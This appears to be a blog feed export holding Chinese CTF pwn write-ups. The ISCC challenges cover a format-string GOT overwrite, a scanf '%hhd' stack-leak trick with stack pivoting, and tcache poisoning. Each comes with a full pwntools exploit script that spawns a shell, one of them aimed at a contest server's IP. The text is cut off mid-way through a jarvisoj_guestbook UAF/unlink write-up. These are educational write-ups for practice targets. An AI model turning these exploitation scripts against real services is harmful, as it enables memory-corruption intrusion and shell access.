0990069ec8cd989aaef7d9682aa49864f1ec989c5f9e875cfd736bea0ce120f77e546880d7bf31a24bf4d495c1a8a1e1202d9238407be524bb13dc9664fc3f8088447b00f32ba83db9c861ac6b6ea0e1548d0698079dbde9a54fed73e2e3f0f3616d9b5228ed811578efdfb2c20aeff2b1e7a0bb1da287fe559ef07a86c6beb27c7a4d13c0a88f5f309dc92c140499201a79abc4bf3b349ffdc3f277334a424d316da606e042ec7000143d4acae4daf8cf63e6161907aa10d8f5799693ea6821eb08b518a2d028f9d1236bfca23291595f57235d5c79096d3bc098efc7d14930232102a8a37366abb0cde39299a86e6381561a3315c687afbd89d72848c1ca62e147ee01df209f7f81b1e59a1136c2688694441adf2287ddfbb06bb7e80aef0b526330f182eb4fbf3a6b414d7706ca38889a3b87509bd9cbe29607d9b96542e0342e5fa4a6342f881106864daea9772bc3c4182fac2a285004ba82363629f78a54c2e978ff89b0f6ce59cd7d794e8b4f07169e204738a0952275034c5c88f59b5abc4d434b653f0733e9ebdbe89c3433810cb72000432069c4d8e57f20ebc6cc7b73eb2f32a73e9409e82c2ce2145125178b34aefbe6d0e79724089048219a75142e4b90688267af6720c8e41143249bd96c53ebf1f7a0ef0203e8ea1d0f06334a7a18fadf07028652918cd40bebb29d6002d29e92dc6c6ebd84f1424e4a7f0e7867929e1dc3d19f5ab96e58eaa18bb1f90f76cedc9cd0b1955961c4369367d90e2c4e51172ba51c871e53819a5497ff4f08700bee13b6587e5d0f37b0d9fd317888bb891d13189204a20c0940b0c7633f7c89d382960817df9ce5c56e7dfd4bd59c0f49cd5df3f8d2f3353a3a71b2bf29dad727f091d96876299a3404d41e322305bfc0d20907bd58df25156d864c695863573a2653fab8ca1ed3d4d8a0962b81a72f6cff5ea835c8884ae2f00a06589708b7a514660d9c6a5cbd874603ac43f2b56de6ab33ecd409072c742c900fb0d6c46a7c252b30ee6ece1a6a98c25e926834d65e5e282263e0449d06814b6aea041cbfee928b656435d81df0d5654eeb43effa5d535232626067e2ba2798261ec6a549000804baacd2fa1f4eb6a9c2c8f91f5c3207693cc1f008546735c332f50118827ea5895f63144835a7fada8a6fbb8fc0f2a8d3a0786b8a9bd67d8ff598b6f9be2f78b481c6b5895853ea1150d53a6c005916a31d5a53fe054eef94e908031922674c79a76250a10357e7058bc280dd75fef432d86df7eee7acffd5b39e1750108d77928b46d7036c8ae4cd3720d9996bf89946e76fa65e18fbd412d185210572447a8db2e9340e93a58a1c3a7275353f32baf031258e45250c4a6880c3e2e2650e2f5400b3c0fb91a061a7f03f1c7670beca0116c6dde94d731b0a0811114984e6058ff698f01ba389d810fa9e0e1598af6e450e34aba95354632147e3a09112eeb364b726789f72c7942c72937be9bc8cc338642b6ae330982b5c9f6ca3fde31d389b7524fcf248d13d141f3c89389da0a165ea3b95fb78164b958d5bb8249542224605a313b2d9656eaf5be6402117f44a23f1c8c07e256994e7041580534a1fd0ea3950af6988398dbbe0f8affec1143717d7c9d7d6b8663bcb03e11a19183a0473d6f7c4da179de2416c274c68247e6fa35cc66083e9db4002a5eeb9242e5099e39d5a1c0645b34cdfe9a39867f3d833b6ad0fe0e7824ec817034213969b396011a198565e6d98886aff36d23504e46423af27e5505a6814e29e733b817c627ae7c45cc848edeaf404c66a9df6c763f6fc4d165c06e4aedd4dce4ea94a465dedc8178696b0feeba8afa4df3b43c4f81275e3e42db1ba71735fae917db2915e37db135b7ff7f91e02cb33a6b015d9dbe499f9e97b2a7cfe38727e68a1e1580410281710861498eda62328351bcec40af5c41397cd0edab2b8d3382be447612948092016f1bee1b0cbd0153287ea75a2036e42eb2647fc8cdb0c6cbd6af8b6461f08cbb54a405deb48955ccb96694a5e7441dc6afb425ac7359c3a982c8a665b27784bed93683877aa76eadbd80e14980e9bf2ec744b15f83bc2b47477bdfe4c2769e1f68b38050d7f84cb17be3cfdc61689e307877bafdbfbfa87760e33532008abd97fcec2ba68f80a62504d06566f5de1ed51f00f5dbbe1158e9125d500304b1eb18c7c2d9fc9b2524a39fe0ff7942a571a2821e6f49351069d6c74209944aa2cd3173dcf29c2eb9fa2db77f783f427be2169edafd34762aaa24f75052a7f3a812c2af96dd4589afcab3c0c3ba4285554fbe72468b2593c73d5831e673004ff8fb83dcd24899bc5ade74c55b58f259f1d6fa0c5cb360b0adcb88c9a9b1155eb1512f02bfc87158874d9ca0c436a21f447f9dfd4c794aa47aabd1b249f621503e37101a6577082804230692c57c9833761c8cb9a6bdb2f04ce40e5d11bc451b0a7062829e28769e82b7de8fe9f1cbdbe63013d2615f165fa86f80a0569b12a65b7d7078e1acf7192b4b3c814e3be185a481fb8ed27edfecf5949b7abe6b67d736d54827a49c106589d551e6226e1f9be8752c1d5c317c9f2e5accabf2443c56c46de8eafcbc5e9199077063a1ce1e6344f46bba58a51e7e05148d3632408733a2d03af58d1add31e476900790e8dacd58494c8</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 私房菜 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 篡改got表 </tag>
            
            <tag> UAF </tag>
            
            <tag> lab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iscc_pwn_部分wp</title>
      <link href="/posts/fcb54cab.html"/>
      <url>/posts/fcb54cab.html</url>
      
        <content type="html"><![CDATA[<p>由于本人比较菜，同时学pwn的时间不是太久，因此iscc的很多堆还没有能力去做，只把比赛的栈题给做完了 赛后又做了一下unlink那道题。其他堆题目前还没有复现。（有一个格式化字符串太简单了，我就不写wp了）</p><h2 id="sim-treasure">sim_treasure</h2><img src="https://s2.loli.net/2022/06/06/sDIeyH3LEjxJrvO.png" alt="image-20220502161408233" style="zoom: 33%;" /><h3 id="大致思路：">大致思路：</h3><p>程序无限次执行格式化字符串漏洞，思路为泄露出函数的真实地址，然后利用libc库里的偏移得到libc基地址，然后加上system函数在libc库中的偏移，用printf把自己的got表改成system函数，然后输入参数/bin/sh即可获取shell。</p><h3 id="EXP">EXP:</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;123.57.69.203&#x27;</span>,<span class="number">7010</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./b&#x27;)![](https://img2022.cnblogs.com/blog/2706180/202206/2706180-20220606104901019-1137756252.png)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./b&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/hacker/Desktop/libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%2$p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">leak=<span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(leak))</span><br><span class="line">payload=<span class="string">&#x27;%8$p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">printf_got_addr=e.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=p32(printf_got_addr)+<span class="string">&#x27;%6$s&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">printf_addr=u32(p.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line">libc=printf_addr-<span class="number">0x512d0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base---------&gt;&#x27;</span>,libc)</span><br><span class="line">hook=leak-<span class="number">0x88</span></span><br><span class="line">ret_addr=<span class="number">0x080483da</span></span><br><span class="line">ret_hook=ret_addr&amp;<span class="number">0xffff</span></span><br><span class="line">bin_sh=<span class="number">0x0017e1db</span>+libc</span><br><span class="line">system=<span class="number">0x0003d200</span>+libc</span><br><span class="line"></span><br><span class="line">low_offset=system&amp;<span class="number">0xffff</span></span><br><span class="line">high_offset=(system&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;hook-------------&gt;&#x27;</span>,<span class="built_in">hex</span>(hook))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;low---------------&gt;&#x27;</span>,<span class="built_in">hex</span>(low_offset))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;high--------------&gt;&#x27;</span>,<span class="built_in">hex</span>(high_offset))</span><br><span class="line">payload=p32(printf_got_addr)+p32(printf_got_addr+<span class="number">2</span>)+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(low_offset-<span class="number">8</span>)+<span class="string">&#x27;c%6$hn&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(high_offset-low_offset)+<span class="string">&#x27;c%7$hn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="跳一跳">跳一跳</h2><h3 id="总结：">总结：</h3><p>1、scanf函数的参数为%hhd时，可以输入<code>-</code>在不覆盖栈中数据的情况下，占据一个字节，配合%s可以泄露栈中任何一个内容。</p><p>2、根据以往的经验感觉没有什么核心利用点的时候，尽量把注意力都集中到新遇到的知识上，这道题我有想过找一些字符去实现在不覆盖栈中数据的情况下，但是没有找到合适的字符，从而放弃了这个思路，甚至尝试用爆破的方式来劫持执行流（不过最后失败了）。</p><h3 id="保护策略：">保护策略：</h3><img src="https://s2.loli.net/2022/06/06/X9vWBjzGlYh8aMD.png" alt="image-20220502150019723" style="zoom: 50%;" /><h3 id="程序分析：">程序分析：</h3><img src="https://s2.loli.net/2022/06/06/NKZ3UjEhoayqJpv.png" alt="image-20220502100753717" style="zoom:50%;" /><p>这道题的关键点就一个，当scanf用%hhd的时候，<code>-</code>这个东西可以不覆盖栈中数据的情况下在栈中占一位，说的有点抽象，代码和效果如下。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x58</span>):</span><br><span class="line">    sleep(<span class="number">0.01</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;17&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x6</span>):</span><br><span class="line">    sleep(<span class="number">0.01</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x4a</span>):</span><br><span class="line">    sleep(<span class="number">0.01</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;18&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="../img/image-20221007200957664.png" alt="image-20221007200957664"></p><p>由上图可以发现存在-的地方没有被填入的垃圾数据所覆盖（0x7f4d1e038680依然存在）</p><p>原理如下：</p><blockquote><p>scanf函数在格式化字符类型和输入字符类型不匹配的时候，不会把输入的字符写到栈上，也不会报错，而是继续运行</p><p>scanf(“%hhd”,a)</p><p>当输入的字符为数字时，才可以被写入栈中，如果是字母则会被定义为非法字符，则会停留在缓冲区导致后面即使出现数字也仅仅是停留到了缓冲区（因为a在缓冲区进不去，后面的数据也都进不去）</p><p>通过阅读scanf函数的源码发现（%d的情况），输入的数据是先到了缓冲区中，然后对输入的数据进行检查，如果是+或-或是数字则会把这个数据从缓冲区中接收，否则不接收（例如字母）。继续阅读scanf的源码发现检测到+和-时，指针向后移动了一位（并不读取+或-到栈上），并且此时程序会认为这个符号仅仅是来表示正负的，然后将继续从缓冲区中读取数据，直到遇到\n。</p><p>这样就造成了最开始说的bug，+和-通过了检查从缓冲区里被提取了出来，但是它让指针往后挪了一位，并没有被写入到内存里，从而达到了占位的目的。</p></blockquote><p><img src="https://s2.loli.net/2022/06/06/V1Dv7kiP5Hrg6J2.png" alt="image-20220511141855121"></p><p>如果是正号或者负号 则可以触发char_buffer_add</p><p>下面是对符号检查部分的代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Check for a sign.  */</span></span><br><span class="line">  negative = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (*s == L_(<span class="string">&#x27;-&#x27;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      negative = <span class="number">1</span>;</span><br><span class="line">      ++s;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (*s == L_(<span class="string">&#x27;+&#x27;</span>))</span><br><span class="line">    ++s;</span><br></pre></td></tr></table></figure><p>（本人只是一位大一的初学者，第一次进行scanf的源码调试（关于搭建源码调试环境的文章在这里  <a href="https://www.cnblogs.com/ZIKH26/articles/16150232.html">here</a>)，如果上述有理解错误的地方，还请各位师傅斧正）</p><p>这个地方是可以简单验证一下，看看是否输入字符会把后面的数字卡在缓冲区。</p><p>代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> buf [<span class="number">256</span>];</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%hhd&quot;</span>,buf);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,buf);</span><br><span class="line">getchar();</span><br><span class="line">gets(buf);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果只输入数字的话，getchar会把回车给读取，然后触发gets就可以再输入一次，效果如下：</p><img src="https://s2.loli.net/2022/06/06/rH6GL4RznAvxZ2p.png" alt="image-20220502203014478" style="zoom:50%;" /><p>如果先输入数字，再输入字符，再输入数字的话，则不会触发gets(因为字符和原本的回车都留在了缓冲区里，getchar并没有读取这个回车，导致了gets执行的时候碰到了回车，gets直接失效)，效果如下：</p><img src="https://s2.loli.net/2022/06/06/EmzlMS8rC19cFRo.png" alt="image-20220502203303941" style="zoom:50%;" /><p>知道了这个原理，这道题基本就乱打了。先看一下栈里能利用的内容</p><p><img src="https://s2.loli.net/2022/06/06/GZfTclSq91zwWVY.png" alt="image-20220502150925505"></p><p>发现里面有_start函数的地址，那用这个可以拿到程序基地址。还有个_setbuffer函数的地址，可以用它来匹配libc库，然后再泄露个栈地址，用于之后的栈迁移，最后就是把canary给泄露出来，用于最后的劫持执行流</p><h3 id="大致思路：-v2">大致思路：</h3><p>我最开始泄露的是IO_2_1_stderr的地址，但是这样做的后果就是搜到了将近两百个版本的libc库，因此泄露setbuffer函数的真实地址。</p><p>泄露的思路提前计算好要泄露的位置，然后将这些位置布置成<code>-</code> 其他位置则填充成垃圾数据，如果是六字节的栈地址，则只填充六字节的<code>-</code>，另外两字节补成垃圾数据，避免让00截断%s。</p><p>得到泄露的内容之后就是一个简单的栈迁移，提前布置system函数以及参数在栈中，改写rbp，最后用leave;ret指令完成迁移获取shell。</p><h3 id="EXP-v2">EXP:</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">autofill_long_libc</span>(<span class="params">target_vul,leak_addr</span>):</span><br><span class="line">    obj = LibcSearcher(target_vul, leak_addr)</span><br><span class="line">    libc_base = leak_addr - obj.dump(target_vul)</span><br><span class="line">    sys_addr = libc_base + obj.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">    bin_sh_addr = libc_base + obj.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;libc_base----&gt;&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    <span class="keyword">return</span> sys_addr, bin_sh_addr</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">autofill_local_libc</span>(<span class="params">target_vul,leak_addr,libc</span>):</span><br><span class="line">    libc_base = leak_addr - libc.symbols[target_vul]</span><br><span class="line">    sys_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    bin_sh_addr = libc_base + libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;libc_base----&gt;&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    <span class="keyword">return</span> sys_addr,bin_sh_addr</span><br><span class="line"><span class="comment">#p=remote(&#x27;123.57.69.203&#x27;,7020)</span></span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Hello CTFer! Welcome to the world of pwn~\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xa8</span>):</span><br><span class="line">    sleep(<span class="number">0.01</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;18&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x6</span>):</span><br><span class="line">    sleep(<span class="number">0.01</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;leak libc_base&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1a</span>):</span><br><span class="line">    sleep(<span class="number">0.01</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;19&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">0x6</span>):</span><br><span class="line">    sleep(<span class="number">0.01</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;leak base&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    sleep(<span class="number">0.01</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;120&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    sleep(<span class="number">0.01</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;leak canary&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x3</span>):</span><br><span class="line">    sleep(<span class="number">0.01</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;21&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">a=p.recv()</span><br><span class="line">setbuffer_addr=u64(a[<span class="number">0xb7</span>:<span class="number">0xbd</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">231</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;setbuffer_addr--------------------&gt;&#x27;</span>,<span class="built_in">hex</span>(setbuffer_addr))</span><br><span class="line">base=u64(a[<span class="number">0xd7</span>:<span class="number">0xdd</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x10a0</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;base-------------------------------&gt;&#x27;</span>,<span class="built_in">hex</span>(base))</span><br><span class="line">leak_stack=u64(a[<span class="number">0xdf</span>:<span class="number">0xe5</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;leak_stack--------------------------&gt;&#x27;</span>,<span class="built_in">hex</span>(leak_stack))</span><br><span class="line">canary=u64(a[<span class="number">0xe8</span>:<span class="number">0xef</span>].rjust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;canary------------------------------&gt;&#x27;</span>,<span class="built_in">hex</span>(canary))</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment">#result=autofill_long_libc(&#x27;setbuffer&#x27;,setbuffer_addr)</span></span><br><span class="line">result=autofill_local_libc(<span class="string">&#x27;setbuffer&#x27;</span>,setbuffer_addr,libc)</span><br><span class="line">sys_addr=result[<span class="number">0</span>]</span><br><span class="line">bin_sh_addr=result[<span class="number">1</span>]</span><br><span class="line">pop_rdi_addr=base+<span class="number">0x130b</span></span><br><span class="line">leave_addr=base+<span class="number">0x124a</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bin_sh_addr))</span><br><span class="line"></span><br><span class="line">payload=p64(pop_rdi_addr)+p64(bin_sh_addr)+p64(sys_addr)</span><br><span class="line">payload=payload.ljust(<span class="number">0xd8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p64(canary)+p64(leak_stack-<span class="number">0x1d0</span>-<span class="number">8</span>)+p64(leave_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="unlink">unlink</h2><h3 id="保护策略：-v2">保护策略：</h3><p><img src="https://s2.loli.net/2022/06/06/na2BjIT164gkDYh.png" alt="image-20220531215015771"></p><h3 id="漏洞分析">漏洞分析</h3><img src="https://s2.loli.net/2022/06/06/x42Uh5sgZFwN9lt.png" alt="image-20220531215332239" style="zoom: 50%;" /><p>存在堆溢出，虽然题目是叫做unlink，但是我试了一下，似乎unlink做不出来（可能是我太菜了）。即使patchup成2.23的，等unlink之后，ptr=&amp;ptr-0x18，再往fake_chunk写入数据，数据会覆盖掉stdin指针。导致程序无法再输入了。因此用unlink的方法就卡住了。</p><p>不过这道题是2.27的，因此可以利用溢出打tcache attack。</p><h3 id="大致思路">大致思路</h3><p>先申请两个chunk，低地址的chunk作为溢出堆块。然后释放掉高地址的chunk，利用溢出修改tcachebin中chunk的fd指针（<strong>这个fd指针修改成哪，接下来申请的chunk的地址就在哪。不过由于从tcachebin中申请chunk时，会将其的bk指针的位置赋值成0，如果fd修改成了一个不可写的地址，程序在这里就会崩溃掉）</strong></p><p>我们fd指针修改为cmd的地址</p><p><img src="https://s2.loli.net/2022/06/06/Mz1N8jpf2ZbKUrB.png" alt="image-20220531231430009"></p><p>它位于bss段，是可写的。因此我们可以将它申请到bss段上，再往这个chunk里写入数据时，就修改了bss段上存储的chunk地址，将chunk地址改为free函数的got表，再对这个chunk进行修改，即可修改free的got表。</p><p>同时要考虑到修改完got表后，下一次输入的数据依旧再往got表里输入，这就意味着我们无法先修改free的真实地址为system，再传入/bin/sh**（因为下回传/bin/sh的时候，free的真实地址又被改成了/bin/sh）<u>因此需要传参和修改got表同时进行</u>**。这道题因为got表中的free和strncmp是挨着的，所以我们可以劫持free的got表，往里面写入/bin/sh\x00和system的plt地址，此时字符串的开头则为/bin/sh\x00（也就是之后strncmp的第一个参数）。同时也将system的plt地址写入到了strncmp中，等到执行strncmp的时候，成功获取shell。</p><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p><h3 id="EXP-v3">EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">debug(p,<span class="number">0x4009BD</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,lenth,content</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;add&#x27;</span>)</span><br><span class="line">    <span class="comment">#p.sendline(fake_chunk)</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(lenth))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;remove&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">bss_addr=<span class="number">0x6010B0</span></span><br><span class="line">back_addr=<span class="number">0x400896</span></span><br><span class="line">sys_addr=e.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_got_addr=e.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x40</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#overflow_chunk</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x30</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">remove(<span class="number">0</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">payload=<span class="number">72</span>*<span class="string">b&#x27;a&#x27;</span>+p64(<span class="number">0x41</span>)+p64(bss_addr)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x40</span>,payload)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x30</span>,<span class="string">b&#x27;bb&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x30</span>,p64(free_got_addr))</span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(sys_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 赛题WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 格式化字符串漏洞 </tag>
            
            <tag> 篡改got表 </tag>
            
            <tag> 堆溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jarvisoj_guestbook</title>
      <link href="/posts/f118134e.html"/>
      <url>/posts/f118134e.html</url>
      
        <content type="html"><![CDATA[<h2 id="保护策略：">保护策略：</h2><p><img src="../img/2706180-20220901212333982-783105096.png" alt=""></p><h2 id="漏洞分析：">漏洞分析：</h2><p>在delete函数中，free函数执行后，未将指针置空存在UAF漏洞</p><p><img src="../img/2706180-20220901212347246-2034102819.png" alt=""></p><p>在读入数据的函数中，未在字符串的末尾添加\x00，来截断字符串，导致show函数中的%s可能泄露出更多的数据</p><p><img src="../img/2706180-20220901212400614-261058314.png" alt=""></p><p>保护为Partial RELRO，这就意味着我们可以修改got表。</p><h2 id="程序分析：">程序分析：</h2><p><img src="../img/2706180-20220901212442314-1247059414.png" alt=""></p><p>在程序的开始就创建了一个很大的堆块，用于之后存放我们创建的堆块的各种信息。</p><p>而我们通常做的堆题，堆块的信息(包括堆块的地址，堆块的大小等等)都记录在了bss段，但是这道题有点特殊，记录在了最开始创建的一个大堆块里。</p><p>在delete函数中虽然存在了uaf，但把存放堆块大小和标志位都给置空了，而edit函数中则检查了标志位，因此无法直接释放掉堆块去写入数据。并且我们申请的堆块会自动和0x80对齐。这就意味着我们这道题无法将堆块释放到fastbin中。</p><p>在edit函数中虽然再次问了我们size，但是却用了realloc函数，因此这里也无法溢出。</p><h2 id="利用思路：">利用思路：</h2><p>这道题我们利用的是unlink，而这个题和常规的unlink有些不一样，常规的unlink一般是给个溢出，然后去篡改bss段存放的堆块信息。而这道题不存在溢出，是利用UAF，覆写之前被free掉的堆块的prev_size和size位来达到unlink的。</p><p>不过在这之前我们需要先泄露一下地址。</p><h3 id="泄露地址：">泄露地址：</h3><p>我们先申请四个堆块，分别为chunk1,chunk2,chunk3,chunk4。我们将chunk1和chunk3释放掉，因为释放掉后一定会进入unsorted bin中，如果不用堆块隔开的话，那么刚释放掉的堆块就会和unsorted bin中的堆块合并。同时还要防止和top chunk合并，因此再申请一个chunk4。</p><p>此时的chunk1和chunk3的情况如下：</p><p><img 